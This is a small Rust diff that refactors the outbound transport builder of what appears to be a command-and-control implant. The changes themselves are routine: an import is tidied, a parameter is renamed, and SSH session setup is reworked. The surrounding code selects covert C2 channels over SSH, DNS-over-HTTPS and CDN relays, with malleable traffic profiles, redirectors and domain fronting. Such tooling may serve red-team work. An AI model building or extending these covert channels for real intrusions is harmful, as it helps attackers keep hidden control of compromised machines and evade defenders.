@@ -30,7 +30,6 @@
 use anyhow::{anyhow, Result};
 use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
-use common::CryptoSession;
 use common::forward_secrecy;
 use common::{LockedSecret, Message, Transport};
 use ed25519_dalek::SigningKey;
@@ -187,7 +186,7 @@ pub async fn build_outbound_transport(
     secret: &str,
     cert_fp: Option<&str>,
     _agent_id: &str,
-    mesh_public_key: Option<[u8; 32]>,
+    _mesh_public_key: Option<[u8; 32]>,
 ) -> Result<Box<dyn Transport + Send>> {
     // Load config once; shared by the covert-transport selection block below
     // and the traffic_profile assignment in the TLS fallback path.
@@ -212,9 +211,8 @@ pub async fn build_outbound_transport(
                         "ssh-transport: ssh_host configured ({}); switching to SshTransport",
                         cfg.malleable_profile.ssh_host.as_deref().unwrap_or("?")
                     );
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_ssh::SshTransport::new(&cfg.malleable_profile, session)
+                        crate::c2_ssh::new_transport(&cfg.malleable_profile, secret)
                             .await
                             .map_err(|e| anyhow!("SshTransport init failed: {e}"))?,
                     ));
@@ -281,7 +279,7 @@ pub async fn build_outbound_transport(
                         "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
                         server_url
                     );
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
                         crate::c2_doh::DohTransport::new(
                             &Default::default(),           // agent malleable profile — DoH shaping uses defaults
@@ -302,13 +300,13 @@ pub async fn build_outbound_transport(
                 if cfg.malleable_profile.cdn_relay {
                     let agent_id = _agent_id;
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
                         crate::c2_http::HttpTransport::new(
                             None,     // agent malleable profile — loaded from server at runtime
                             session,
                             agent_id.to_string(),
-                            mesh_public_key,
+                            _mesh_public_key,
                             Some(&cfg.malleable_profile),
                             vec![],   // redirectors — populated via server push at runtime
                             None,     // front_domain — populated via server push at runtime
